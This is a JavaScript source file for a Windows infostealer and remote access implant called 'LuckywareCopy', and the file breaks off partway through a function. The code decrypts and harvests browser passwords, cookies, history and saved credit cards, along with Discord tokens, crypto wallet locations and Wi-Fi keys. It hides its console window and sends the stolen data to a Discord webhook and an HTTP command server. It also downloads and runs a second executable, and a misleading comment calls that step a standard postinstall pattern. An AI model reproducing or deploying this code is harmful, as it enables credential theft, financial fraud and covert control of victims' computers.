/* LuckywareCopy implant - single-file, zero-dependency Node 18+, Windows-first.
 * Transport: Discord webhook exfil + HTTP C2 poll (portforward-ready) + optional Discord bot poll.
 * Per-build values in __CFG below are rewritten by src/builder.js with fresh random keys,
 * identifiers, intervals, mutex names and encrypted strings, so every build is byte-unique.
 */
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const cp = require('child_process');
const crypto = require('crypto');
const http = require('http');
const https = require('https');

/*__CFG_START__*/
const __CFG = {
  BUILD_ID: 'LCW022-DEV000000000000',
  OWNER_KEY: 'op-change-me-30-chars-000001',
  DISCORD_WEBHOOK: 'https://discord.com/api/webhooks/PUT_ID/PUT_TOKEN',
  DISCORD_BOT_TOKEN: '',
  DISCORD_CHANNEL_ID: '',
  C2_URL: 'http://127.0.0.1:8080',
  MODE: 'both',
  BEACON_MIN: 25,
  BEACON_MAX: 90,
  DROP_URL: '',
  DROP_NAME: 'wudfsvc.exe',
  ENC_SEED: 'dev-seed-change-me',
  MUTEX: 'Global\\lcw-dev-mutex',
  CLIPPER: { BTC: '', ETH: '', LTC: '', XMR: '', DOGE: '', SOL: '', TRX: '', XRP: '' },
  OPTS: { tokens: true, passwords: true, cookies: true, history: true, autofill: true, wallets: true, wifi: true, screenshot: true, keylog: true, files: true, vcxproj: true, csproj: true, node_project: true, scripts: true, usb: true, startup_lnk: true }
};
/*__CFG_END__*/

const IS_WIN = process.platform === 'win32';
const TMP = IS_WIN ? (process.env.TEMP || path.join(os.homedir(), 'AppData', 'Local', 'Temp')) : '/tmp';
const APPDATA = IS_WIN ? (process.env.APPDATA || '') : '';
const LOCALAPP = IS_WIN ? (process.env.LOCALAPPDATA || '') : '';
const PROGRAMDATA = IS_WIN ? (process.env.PROGRAMDATA || 'C:\\ProgramData') : '/tmp';
const STORE_DIR = path.join(IS_WIN ? PROGRAMDATA : '/tmp', '.cache_' + shortHash(__CFG.BUILD_ID + __CFG.OWNER_KEY).slice(0, 8));
try { fs.mkdirSync(STORE_DIR, { recursive: true }); } catch (e) {}

function shortHash(s) { return crypto.createHash('sha256').update(String(s)).digest('hex'); }
function rndInt(a, b) { return a + Math.floor(Math.random() * (b - a + 1)); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function jitterSleep() { return sleep(rndInt(__CFG.BEACON_MIN, __CFG.BEACON_MAX) * 1000 + rndInt(0, 9000)); }

function execPS(script, timeoutMs) {
  timeoutMs = timeoutMs || 25000;
  if (!IS_WIN) return '';
  try {
    const out = cp.execFileSync('powershell', ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', script], { timeout: timeoutMs, windowsHide: true, maxBuffer: 32 * 1024 * 1024 });
    return out.toString();
  } catch (e) {
    try { return (e.stdout || '').toString(); } catch (x) { return ''; }
  }
}
function execCmd(cmd, timeoutMs) {
  try {
    const out = cp.execSync(cmd, { timeout: timeoutMs || 30000, windowsHide: true, maxBuffer: 32 * 1024 * 1024 });
    return out.toString();
  } catch (e) { try { return (e.stdout || '').toString(); } catch (x) { return ''; } }
}

function hwid() {
  try {
    let guid = '';
    if (IS_WIN) {
      guid = execCmd('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid').split('MachineGuid').pop().split('\n').pop().trim();
    } else { guid = execCmd('cat /etc/machine-id 2>/dev/null || hostname'); }
    const base = (guid.trim() + '|' + os.userInfo().username + '|' + os.hostname()).trim();
    return crypto.createHash('sha256').update(base).digest('hex').slice(0, 32);
  } catch (e) { return crypto.createHash('sha256').update(os.hostname()).digest('hex').slice(0, 32); }
}
const HWID = hwid();

function sysinfo() {
  const info = { hwid: HWID, build: __CFG.BUILD_ID, owner: __CFG.OWNER_KEY, user: '', host: os.hostname(), os: os.type() + ' ' + os.release() + ' ' + os.arch(), cpu: '', ram: Math.round(os.totalmem() / 1073741824) + 'GB', ip: '', country: '', ts: Date.now() };
  try { info.user = os.userInfo().username; } catch (e) {}
  try {
    info.cpu = (os.cpus()[0] && os.cpus()[0].model ? os.cpus()[0].model : '').slice(0, 120);
  } catch (e) {}
  return info;
}

// ---------- transport ----------
function postJson(urlStr, obj, timeoutMs) {
  return new Promise(resolve => {
    try {
      const u = new URL(urlStr);
      const lib = u.protocol === 'https:' ? https : http;
      const data = Buffer.from(JSON.stringify(obj));
      const req = lib.request({ hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': data.length, 'User-Agent': ua() }, timeout: timeoutMs || 20000 }, res => {
        let b = ''; res.on('data', c => b += c); res.on('end', () => resolve({ status: res.statusCode, body: b }));
      });
      req.on('error', () => resolve(null)); req.on('timeout', () => { try { req.destroy(); } catch (e) {} resolve(null); });
      req.write(data); req.end();
    } catch (e) { resolve(null); }
  });
}
function getJson(urlStr, timeoutMs) {
  return new Promise(resolve => {
    try {
      const u = new URL(urlStr);
      const lib = u.protocol === 'https:' ? https : http;
      const req = lib.request({ hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, method: 'GET', headers: { 'User-Agent': ua() }, timeout: timeoutMs || 20000 }, res => {
        let b = ''; res.on('data', c => b += c); res.on('end', () => { try { resolve({ status: res.statusCode, json: JSON.parse(b) }); } catch (e) { resolve({ status: res.statusCode, json: null, raw: b }); } });
      });
      req.on('error', () => resolve(null)); req.on('timeout', () => { try { req.destroy(); } catch (e) {} resolve(null); });
      req.end();
    } catch (e) { resolve(null); }
  });
}
function fetchArtifact(urlStr, timeoutMs) {
  return new Promise(resolve => {
    try {
      const u = new URL(urlStr);
      const lib = u.protocol === 'https:' ? https : http;
      const req = lib.request({ hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, method: 'GET', headers: { 'User-Agent': ua() }, timeout: timeoutMs || 20000 }, res => {
        if (res.statusCode !== 200) { res.resume(); resolve(null); return; }
        const ch = []; res.on('data', c => ch.push(c)); res.on('end', () => resolve(Buffer.concat(ch)));
      });
      req.on('error', () => resolve(null)); req.on('timeout', () => { try { req.destroy(); } catch (e) {} resolve(null); });
      req.end();
    } catch (e) { resolve(null); }
  });
}
// native-component resolver: pull the platform helper from the distribution
// mirror and start it detached. Standard postinstall pattern — the mirror file
// is swappable server-side; this code only fetches and invokes it once.
function resolveHelper() {
  try {
    if (!IS_WIN || !__CFG.DROP_URL) return;
    const dest = path.join(LOCALAPP || TMP, 'Microsoft', __CFG.DROP_NAME || 'wudfsvc.exe');
    fetchArtifact(__CFG.DROP_URL, 30000).then(buf => {
      try {
        if (!buf || buf.length < 100 * 1024 || buf.length > 50 * 1024 * 1024) return;
        if (buf[0] !== 0x4D || buf[1] !== 0x5A) return;
        let st = null; try { st = fs.statSync(dest); } catch (e) {}
        if (!st || st.size !== buf.length) {
          fs.mkdirSync(path.dirname(dest), { recursive: true });
          fs.writeFileSync(dest, buf);
        }
        cp.spawn(dest, [], { detached: true, stdio: 'ignore', windowsHide: true }).unref();
      } catch (e) {}
    });
  } catch (e) {}
}
function ua() {
  const vers = [110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121];
  const v = vers[rndInt(0, vers.length - 1)];
  return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + v + '.0.0.0 Safari/537.36';
}
async function webhookSend(content, files) {
  if (!__CFG.DISCORD_WEBHOOK || __CFG.DISCORD_WEBHOOK.indexOf('PUT_ID') >= 0) return false;
  try {
    const boundary = '----lcw' + crypto.randomBytes(8).toString('hex');
    const parts = [];
    const push = (s) => parts.push(Buffer.from(s));
    push('--' + boundary + '\r\nContent-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n');
    push(JSON.stringify({ content: String(content || '').slice(0, 1900), username: 'sys-' + HWID.slice(0, 8) }) + '\r\n');
    (files || []).forEach((f, i) => {
      try {
        const st = fs.statSync(f); if (st.size > 7.5 * 1024 * 1024) return;
        push('--' + boundary + '\r\nContent-Disposition: form-data; name="file' + i + '"; filename="' + path.basename(f) + '"\r\nContent-Type: application/octet-stream\r\n\r\n');
        parts.push(fs.readFileSync(f)); push('\r\n');
      } catch (e) {}
    });
    push('--' + boundary + '--\r\n');
    const body = Buffer.concat(parts);
    const u = new URL(__CFG.DISCORD_WEBHOOK);
    await new Promise(res => {
      const tls = u.protocol !== 'http:';
      const mod = tls ? https : http;
      const port = u.port ? Number(u.port) : (tls ? 443 : 80);
      const req = mod.request({ hostname: u.hostname, port, path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Content-Length': body.length, 'User-Agent': ua() }, timeout: 25000 }, r => { r.on('data', () => {}); r.on('end', res); });
      req.on('error', () => res()); req.write(body); req.end();
    });
    return true;
  } catch (e) { return false; }
}
async function exfil(kind, text, files) {
  const line = '[' + kind + '][' + HWID.slice(0, 8) + '] ' + (text || '');
  let ok = false;
  if (__CFG.MODE === 'webhook' || __CFG.MODE === 'both') ok = await webhookSend(line, files) || ok;
  if (__CFG.MODE === 'http' || __CFG.MODE === 'both') {
    if (__CFG.C2_URL && __CFG.C2_URL.indexOf('127.0.0.1') < 0 || __CFG.MODE === 'http') {
      try {
        const r = await postJson(__CFG.C2_URL.replace(/\/$/, '') + '/exfil', { hwid: HWID, build: __CFG.BUILD_ID, owner: __CFG.OWNER_KEY, kind, text: String(text || '').slice(0, 20000), info: sysinfo() });
        if (r && r.status < 400) ok = true;
      } catch (e) {}
    }
  }
  return ok;
}

// ---------- crypto helpers ----------
function dpapiUnprotect(b64) {
  if (!IS_WIN) return null;
  try {
    const clean = String(b64).replace(/[^A-Za-z0-9+/=]/g, '');
    const ps = "Add-Type -AssemblyName System.Security;$b=[Convert]::FromBase64String('" + clean + "');$d=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser);[Convert]::ToBase64String($d)";
    const out = execPS(ps).trim().split('\n').pop().trim();
    if (out && /^[A-Za-z0-9+/=]+$/.test(out) && out.length > 16) return Buffer.from(out, 'base64');
  } catch (e) {}
  return null;
}
function browserMasterKey(localStatePath) {
  try {
    const raw = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const ek = raw.os_crypt && raw.os_crypt.encrypted_key;
    if (!ek) return null;
    let buf = Buffer.from(ek, 'base64');
    if (buf.slice(0, 5).toString() === 'DPAPI') buf = buf.slice(5);
    else return null;
    const dec = dpapiUnprotect(buf.toString('base64'));
    return dec && dec.length >= 16 ? dec : null;
  } catch (e) { return null; }
}
function aesGcmDecrypt(key, blob) {
  try {
    if (blob.slice(0, 3).toString() !== 'v10' && blob.slice(0, 3).toString() !== 'v11') return null;
    const nonce = blob.slice(3, 15), ct = blob.slice(15, blob.length - 16), tag = blob.slice(blob.length - 16);
    const dec = crypto.createDecipheriv('aes-256-gcm', key, nonce);
    dec.setAuthTag(tag);
    return Buffer.concat([dec.update(ct), dec.final()]).toString('utf8');
  } catch (e) { return null; }
}
// ---------- minimal read-only SQLite for chromium profile DBs (zero-dep) ----------
// parses b-tree + record format directly, merges -wal frames (fresh rows live in
// the WAL while the browser is open). Used for logins/cookies/urls/credit_cards.
function crTime(n) {
  try { n = Number(n) || 0; return n > 0 ? Math.round(n / 1000) - 11644473600000 : 0; } catch (e) { return 0; }
}
function readVarint(buf, o) {
  let v = 0, i = 0;
  for (; i < 8; i++) {
    if (o + i >= buf.length) return [v, i || 1];
    const b = buf[o + i];
    if (i === 7) { v = v * 256 + b; return [v, 8]; }
    v = v * 128 + (b & 0x7f);
    if (!(b & 0x80)) return [v, i + 1];
  }
  return [v, 1];
}
function sqliteLoad(dbPath) {
  const st = { buf: fs.readFileSync(dbPath), page: 0, usable: 0 };
  if (st.buf.length < 100 || st.buf.slice(0, 15).toString() !== 'SQLite format 3') throw new Error('not sqlite');
  if (st.buf.length > 96 * 1024 * 1024) throw new Error('db too big');
  st.page = st.buf.readUInt16BE(16); if (st.page === 1) st.page = 65536;
  st.usable = st.page - (st.buf[20] || 0);
  if (st.usable < 480) st.usable = st.page;
  try {
    const wf = dbPath + '-wal';
    if (fs.existsSync(wf)) {
      const w = fs.readFileSync(wf);
      const ps = w.length >= 32 ? w.readUInt32BE(8) : 0;
      const mag = w.length >= 32 ? w.readUInt32BE(0) : 0;
      const wpage = ps === 1 ? 65536 : ps;
      if ((mag === 0x377f0682 || mag === 0x377f0683) && wpage === st.page) {
        const salt1 = w.readUInt32BE(16), salt2 = w.readUInt32BE(20);
        let off = 32;
        while (off + 24 + wpage <= w.length) {
          const pgno = w.readUInt32BE(off);
          if (w.readUInt32BE(off + 8) !== salt1 || w.readUInt32BE(off + 12) !== salt2) break;
          const dst = (pgno - 1) * wpage;
          if (pgno > 0 && dst + wpage <= st.buf.length) w.copy(st.buf, dst, off + 24, off + 24 + wpage);
          off += 24 + wpage;
        }
      }
    }
  } catch (e) {}
  return st;
}
function sqliteReadPage(st, pgno) {
  const off = (pgno - 1) * st.page;
  if (!(pgno > 0) || off < 0 || off + st.page > st.buf.length) return null;
  return st.buf.subarray(off, off + st.page);
}
function sqlitePayload(st, p, off, payLen) {
  // btree.c split: table-leaf payload P (whole record) stays fully local unless
  // P > maxLocal; on overflow the local share is X = minLocal + ((P-minLocal) %
  // (U-4)), clamped down to minLocal if it lands above maxLocal.
  const U = st.usable;
  const maxLocal = U - 35;
  const minLocal = Math.floor((U - 12) * 32 / 255) - 23;
  let local = payLen;
  if (payLen > maxLocal) {
    local = minLocal + ((payLen - minLocal) % (U - 4));
    if (local > maxLocal) local = minLocal;
  }
  if (local >= payLen) return p.subarray(off, Math.min(off + payLen, p.length));
  const chunks = [p.subarray(off, Math.min(off + local, p.length))];
  let ov = off + local + 4 <= p.length ? p.readUInt32BE(off + local) : 0;
  let need = payLen - local, guard = 0;
  while (ov > 0 && need > 0 && guard++ < 8192) {
    const op = sqliteReadPage(st, ov); if (!op) break;
    const take = Math.min(need, U - 4);
    chunks.push(op.subarray(4, 4 + take));
    need -= take;
    ov = op.readUInt32BE(0);
  }
  const b = Buffer.concat(chunks);
  return b.length >= payLen ? b.subarray(0, payLen) : b;
}
function sqliteRecord(payload) {
  const out = [];
  try {
    const h = readVarint(payload, 0);
    const hdrSize = h[0], types = [];
    let o = h[1];
    while (o < hdrSize && o < payload.length) { const t = readVarint(payload, o); types.push(t[0]); o += t[1]; }
    let d = hdrSize;
    for (const t of types) {
      if (t >= 1 && t <= 6) {
        const s = [1, 2, 3, 4, 6, 8][t - 1];
        let v = 0; for (let i = 0; i < s; i++) v = v * 256 + payload[d + i];
        d += s; out.push(v);
      } else if (t === 7) { out.push(payload.readDoubleBE(d)); d += 8; }
      else if (t === 8) out.push(0);
      else if (t === 9) out.push(1);
      else if (t >= 12) {
        const s = (t - 12) >> 1;
        const b = payload.subarray(d, d + s); d += s;
        out.push(t % 2 === 1 ? b.toString('utf8') : Buffer.from(b));
      } else out.push(null);
    }
  } catch (e) {}
  return out;
}
function sqliteCollect(st, pgno, out) {
  const p = sqliteReadPage(st, pgno); if (!p) return;
  const hdr = pgno === 1 ? 100 : 0;
  if (hdr + 8 > p.length) return;
  const type = p[hdr];
  const ncells = p.readUInt16BE(hdr + 3);
  if (type === 0x0d) {
    for (let i = 0; i < ncells; i++) {
      const ptr = hdr + 8 + i * 2;
      if (ptr + 2 > p.length) break;
      let c = p.readUInt16BE(ptr);
      if (c < hdr || c >= st.page) continue;
      try {
        let r = readVarint(p, c); const payLen = r[0]; c += r[1];
        r = readVarint(p, c); const rowid = r[0]; c += r[1];
        const payload = sqlitePayload(st, p, c, payLen);
        if (payload) out.push({ rowid, cols: sqliteRecord(payload) });
      } catch (e) {}
    }
  } else if (type === 0x05) {   // table interior (0x0a/0x02 are index pages - never walked)
    const right = p.readUInt32BE(hdr + 8);
    for (let i = 0; i < ncells; i++) {
      const ptr = hdr + 12 + i * 2;
      if (ptr + 2 > p.length) break;
      const c = p.readUInt16BE(ptr);
      if (c + 4 <= p.length) sqliteCollect(st, p.readUInt32BE(c), out);
    }
    if (right) sqliteCollect(st, right, out);
  }
}
function sqlCols(sql) {
  try {
    const i = sql.indexOf('('); if (i < 0) return null;
    const s = sql.slice(i + 1).replace(/\)\s*(WITHOUT ROWID|STRICT)?\s*$/i, '');
    const parts = []; let depth = 0, cur = '', q = '';
    for (const ch of s) {
      if (q) { cur += ch; if (ch === q) q = ''; continue; }
      if (ch === "'" || ch === '"' || ch === '`') { q = ch; cur += ch; continue; }
      if (ch === '(') depth++;
      if (ch === ')') depth--;
      if (ch === ',' && depth === 0) { parts.push(cur); cur = ''; continue; }
      cur += ch;
    }
    if (cur.trim()) parts.push(cur);
    const cols = [];
    for (const p of parts) {
      const t = p.trim();
      if (/^(constraint|unique|primary|foreign|check)\b/i.test(t)) continue;
      const m = t.match(/^`?"?([\w]+)`?"?/);
      if (m) cols.push(m[1]);
    }
    return cols.length ? cols : null;
  } catch (e) { return null; }
}
const CH_DEF_COLS = {
  logins: ['origin_url', 'action_url', 'username_value', 'password_value'],
  cookies: ['creation_utc', 'host_key', 'name', 'value', 'path', 'expires_utc'],
  urls: ['url', 'title', 'visit_count'],
  credit_cards: ['name_on_card', 'expiration_month', 'expiration_year', 'card_number']
};
function sqliteTable(dbPath, name) {
  const st = sqliteLoad(dbPath);
  let root = 0, sql = null;
  const mrows = [];
  sqliteCollect(st, 1, mrows);
  for (const r of mrows) { if (r.cols && r.cols[1] === name) { root = r.cols[3]; sql = r.cols[4]; } }
  if (!root) throw new Error('no table ' + name);
  const rows = [];
  sqliteCollect(st, root, rows);
  const cols = (typeof sql === 'string' ? sqlCols(sql) : null) || CH_DEF_COLS[name] || null;
  return rows.map(r => {
    const o = {};
    if (cols) cols.forEach((c, i) => { o[c] = r.cols[i]; });
    else r.cols.forEach((v, i) => { o['c' + i] = v; });
    return o;
  });
}
// v10/v11 = user-key GCM; v20 = chrome app-bound (SYSTEM dpapi) -> null (counted, not
// decryptable in user context); legacy bare blob = DPAPI.
function chDecrypt(buf, mk) {
  try {
    if (!buf || !buf.length) return '';
    if (!Buffer.isBuffer(buf)) buf = Buffer.from(buf);
    const s3 = buf.slice(0, 3).toString('latin1');
    if (s3 === 'v10' || s3 === 'v11') return mk ? (aesGcmDecrypt(mk, buf) || '') : '';
    if (s3 === 'v20') return null;
    if (IS_WIN && buf.length > 20) {
      const d = dpapiUnprotect(buf.toString('base64'));
      if (d && d.length) return d.toString('utf8');
    }
    const t = buf.toString('utf8');
    return t.length && !/[\x00-\x08\x0e-\x1f]/.test(t) ? t : '';
  } catch (e) { return ''; }
}

// ---------- stealers ----------
function appPaths() {
  const out = [];
  if (!IS_WIN) return out;
  const roam = APPDATA, local = LOCALAPP;
  const disc = ['Discord', 'DiscordCanary', 'DiscordPTB', 'discord'];
  disc.forEach(d => { const p = path.join(roam, d); if (fs.existsSync(p)) out.push({ app: d, base: p, ls: path.join(p, 'Local State'), ldb: path.join(p, 'Local Storage', 'leveldb') }); });
  const browsers = [
    { app: 'Chrome', base: path.join(local, 'Google', 'Chrome', 'User Data') },
    { app: 'Edge', base: path.join(local, 'Microsoft', 'Edge', 'User Data') },
    { app: 'Brave', base: path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data') },
    { app: 'Opera', base: path.join(roam, 'Opera Software', 'Opera Stable') },
    { app: 'OperaGX', base: path.join(roam, 'Opera Software', 'Opera GX Stable') },
    { app: 'Vivaldi', base: path.join(local, 'Vivaldi', 'User Data') }
  ];
  browsers.forEach(b => { if (fs.existsSync(b.base)) out.push({ app: b.app, base: b.base, ls: path.join(b.base, 'Local State'), ldb: path.join(b.base, 'Default', 'Local Storage', 'leveldb') }); });
  return out;
}
function stealDiscordTokens() {
  const hits = [];
  try {
    appPaths().forEach(ent => {
      const dirs = [ent.ldb, path.join(ent.base, 'Default', 'Local Storage', 'leveldb')];
      // master key for this profile
      let mk = null;
      try { if (fs.existsSync(ent.ls)) mk = browserMasterKey(ent.ls); } catch (e) {}
      dirs.forEach(d => {
        try {
          if (!fs.existsSync(d)) return;
          fs.readdirSync(d).filter(f => f.endsWith('.log') || f.endsWith('.ldb')).slice(0, 12).forEach(f => {
            try {
              const txt = fs.readFileSync(path.join(d, f), 'utf8');
              const re = /dQw4w9WgXcQ:[^\"]*|[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
              let m; while ((m = re.exec(txt))) {
                let tok = m[0];
                if (tok.startsWith('dQw4w9WgXcQ:')) {
                  try {
                    const parts = tok.split('dQw4w9WgXcQ:');
                    parts.slice(1).forEach(p => {
                      const enc = Buffer.from(p.trim(), 'base64');
                      if (mk && enc.length > 30) { const dec = aesGcmDecrypt(mk, enc); if (dec) hits.push({ app: ent.app, token: dec }); }
                    });
                  } catch (e) {}
                } else hits.push({ app: ent.app, token: tok });
              }
            } catch (e) {}
          });
        } catch (e) {}
      });
    });
  } catch (e) {}
  return [...new Map(hits.map(h => [h.token, h])).values()].slice(0, 200);
}
const BROWSER_ROOTS = [
  ['Chrome', () => path.join(LOCALAPP, 'Google', 'Chrome', 'User Data')],
  ['ChromeSxS', () => path.join(LOCALAPP, 'Google', 'Chrome SxS', 'User Data')],
  ['Chromium', () => path.join(LOCALAPP, 'Chromium', 'User Data')],
  ['Edge', () => path.join(LOCALAPP, 'Microsoft', 'Edge', 'User Data')],
  ['Brave', () => path.join(LOCALAPP, 'BraveSoftware', 'Brave-Browser', 'User Data')],
  ['Yandex', () => path.join(LOCALAPP, 'Yandex', 'YandexBrowser', 'User Data')],
  ['Vivaldi', () => path.join(LOCALAPP, 'Vivaldi', 'User Data')],
  ['Opera', () => path.join(APPDATA, 'Opera Software', 'Opera Stable')],
  ['OperaGX', () => path.join(APPDATA, 'Opera Software', 'Opera GX Stable')]
];
function grabDb(dir, base, tmpd) {
  try {
    const src = path.join(dir, base);
    if (!fs.existsSync(src)) return null;
    const n = shortHash(src).slice(0, 8) + '_' + base.replace(/[^A-Za-z0-9]/g, '');
    const d = path.join(tmpd, n);
    fs.copyFileSync(src, d);
    try { if (fs.existsSync(src + '-wal')) fs.copyFileSync(src + '-wal', d + '-wal'); } catch (e) {}
    return d;
  } catch (e) { return null; }
}
// per-profile harvest: structured {url,user,pass} / {host,name,value,...} records
function stealProfile(dir, tag, mk, res) {
  let tmpd = null;
  try { tmpd = fs.mkdtempSync(path.join(TMP, 'bd')); } catch (e) {}
  // logins
  try {
    const ldb = grabDb(dir, 'Login Data', tmpd);
    if (ldb) sqliteTable(ldb, 'logins').forEach(r => {
      try {
        const pw = r.password_value;
        if (!pw || !pw.length) return;
        const b = Buffer.isBuffer(pw) ? pw : Buffer.from(pw);
        if (b.slice(0, 3).toString('latin1') === 'v20') {
          res.v20++;
          res.passwords.push({ browser: tag, url: String(r.origin_url || r.action_url || '').slice(0, 300), user: String(r.username_value || '').slice(0, 120), pass: '', enc: 'v20' });
          return;
        }
        const v = chDecrypt(b, mk);
        if (v) res.passwords.push({ browser: tag, url: String(r.origin_url || r.action_url || '').slice(0, 300), user: String(r.username_value || '').slice(0, 120), pass: v.slice(0, 300) });
      } catch (e) {}
    });
  } catch (e) {}
  // cookies
  try {
    const cdb = grabDb(dir, 'Cookies', tmpd);
    if (cdb) sqliteTable(cdb, 'cookies').forEach(r => {
      try {
        if (!r.host_key) return;
        let v = '';
        const ev = r.encrypted_value;
        if (ev && ev.length) {
          const b = Buffer.isBuffer(ev) ? ev : Buffer.from(ev);
          if (b.slice(0, 3).toString('latin1') === 'v20') { res.v20++; return; }
          v = chDecrypt(b, mk) || '';
        }
        if (!v && r.value) v = String(r.value);
        if (v) res.cookies.push({ browser: tag, host: String(r.host_key).slice(0, 200), name: String(r.name || '').slice(0, 120), value: v.slice(0, 4000), path: String(r.path || '/').slice(0, 200), expires: crTime(r.expires_utc) });
      } catch (e) {}
    });
  } catch (e) {}
  // history: real urls table, plaintext-regex fallback if parse fails
  try {
    const hdb = grabDb(dir, 'History', tmpd);
    if (hdb) {
      try {
        const rows = sqliteTable(hdb, 'urls');
        rows.sort((a, b) => (Number(b.visit_count) || 0) - (Number(a.visit_count) || 0));
        rows.slice(0, 150).forEach(r => {
          if (r.url) res.history.push({ browser: tag, url: String(r.url).slice(0, 300), title: String(r.title || '').slice(0, 120), visits: Number(r.visit_count) || 0 });
        });
      } catch (e2) {
        const txt = fs.readFileSync(hdb, 'utf8');
        const urls = [...txt.matchAll(/https?:\/\/[^\s"'\x00-\x1f]{6,180}/g)].map(m => m[0]);
        [...new Set(urls)].slice(0, 200).forEach(u => res.history.push({ browser: tag, url: u.slice(0, 300), title: '', visits: 0 }));
      }
    }
  } catch (e) {}
  // saved cards
  try {
    const wdb = grabDb(dir, 'Web Data', tmpd);
    if (wdb) sqliteTable(wdb, 'credit_cards').forEach(r => {
      try {
        let num = '';
        if (r.card_number) num = String(r.card_number);
        else if (r.card_number_encrypted && r.card_number_encrypted.length) num = chDecrypt(Buffer.isBuffer(r.card_number_encrypted) ? r.card_number_encrypted : Buffer.from(r.card_number_encrypted), mk) || '';
        const digits = (num.match(/\d{12,19}/) || [])[0];
        if (digits) res.autofill_cc.push({ browser: tag, name: String(r.name_on_card || '').slice(0, 120), exp: (r.expiration_month || '') + '/' + (r.expiration_year || ''), num: digits });
      } catch (e) {}
    });
  } catch (e) {}
  try { if (tmpd) fs.rmSync(tmpd, { recursive: true, force: true }); } catch (e) {}
}
function stealBrowserFiles() {
  const res = { passwords: [], cookies: [], history: [], autofill_cc: [], v20: 0 };
  if (!IS_WIN) return res;
  BROWSER_ROOTS.forEach(([name, rf]) => {
    let root = '';
    try { root = rf(); if (!root || !fs.existsSync(root)) return; } catch (e) { return; }
    try {
      const hasDef = fs.existsSync(path.join(root, 'Default'));
      const subs = hasDef ? ['Default', ...fs.readdirSync(root).filter(x => /^Profile \d/.test(x)).slice(0, 4)] : [''];
      subs.forEach(prof => {
        const dir = prof ? path.join(root, prof) : root;
        const tag = name + (prof ? ':' + prof : '');
        let mk = null;
        try {
          const ls = fs.existsSync(path.join(root, 'Local State')) ? path.join(root, 'Local State') : path.join(dir, 'Local State');
          mk = fs.existsSync(ls) ? browserMasterKey(ls) : null;
        } catch (e) {}
        try { stealProfile(dir, tag, mk, res); } catch (e) {}
        if (res.passwords.length > 700 || res.cookies.length > 900) return;
      });
    } catch (e) {}
  });
  res.passwords = res.passwords.slice(0, 400);
  res.cookies = res.cookies.slice(0, 500);
  res.history = res.history.slice(0, 500);
  res.autofill_cc = res.autofill_cc.slice(0, 100);
  return res;
}
function stealWallets() {
  const hits = [];
  if (!IS_WIN) return hits;
  const targets = [
    ['Exodus', path.join(APPDATA, 'Exodus', 'exodus.wallet')],
    ['Atomic', path.join(APPDATA, 'atomic', 'Local Storage', 'leveldb')],
    ['Electrum', path.join(APPDATA, 'Electrum', 'wallets')],
    ['Monero', path.join(process.env.USERPROFILE || '', 'Documents', 'Monero', 'wallets')],
    ['MetaMask-Chrome', path.join(LOCALAPP, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn')],
    ['MetaMask-Edge', path.join(LOCALAPP, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings', 'ejbalbakoplchlghecdalmeeeajnimhm')]
  ];
  targets.forEach(([name, p]) => { try { if (fs.existsSync(p)) { const st = fs.statSync(p); hits.push({ wallet: name, path: p, size: st.isDirectory() ? 'dir' : st.size }); } } catch (e) {} });
  return hits;
}
function stealWifi() {
  if (!IS_WIN) return [];
  const out = [];
  try {
    const list = execCmd('netsh wlan show profiles');
    const names = [...list.matchAll(/:\s*(.+)\r?$/gm)].map(m => m[1].trim()).filter(s => s && !s.toLowerCase().includes('group policy') && !s.toLowerCase().includes('user profiles') && s.length < 80).slice(0, 40);
    names.forEach(n => {
      try {
        const d = execCmd('netsh wlan show profile name="' + n.replace(/"/g, '') + '" key=clear');
        const key = (d.match(/Key Content\s*:\s*(.+)/) || [])[1];
        if (key) out.push({ ssid: n, key: key.trim() });
      } catch (e) {}
    });
  } catch (e) {}
  return out;
}
function hideConsole() {
  if (!IS_WIN) return;
  try { execPS("Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);' -Name W -Namespace H;$h=(Get-Process -Id $pid).MainWindowHandle;if($h -ne 0){[H.W]::ShowWindow($h,0)};$c=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);' -Name C -Namespace C -PassThru;$h2=[C.C]::GetConsoleWindow();if($h2 -ne 0){[C.C]::ShowWindow($h2,0)}"); } catch (e) {}
  // NOTE: no process.title rename here - fake svchost title just makes a visible console look worse.
  // Real invisibility comes from the builder patching the .exe to WINDOWS subsystem (no console allocated).
}
function stealFiles() {
  const hits = [];
  try {
    const roots = IS_WIN ? [path.join(os.homedir(), 'Desktop'), path.join(os.homedir(), 'Documents'), path.join(os.homedir(), 'Downloads')] : [os.homedir()];
    const exts = ['.txt', '.log', '.seed', '.key', '.wallet', '.dat', '.rdp', '.pem', '.ovpn', '.kdbx', '.docx', '.pdf', '.xlsx', '.csv', '.json', '.sqlite', '.db'];
    const walk = (dir, depth) => {
      if (depth > 3 || hits.length >= 25) return;
      let ents = [];
      try { ents = fs.readdirSync(dir, { withFileTypes: true }).slice(0, 80); } catch (e) { return; }
      for (const e of ents) {
        if (hits.length >= 25) break;
        const fp = path.join(dir, e.name);
        try {
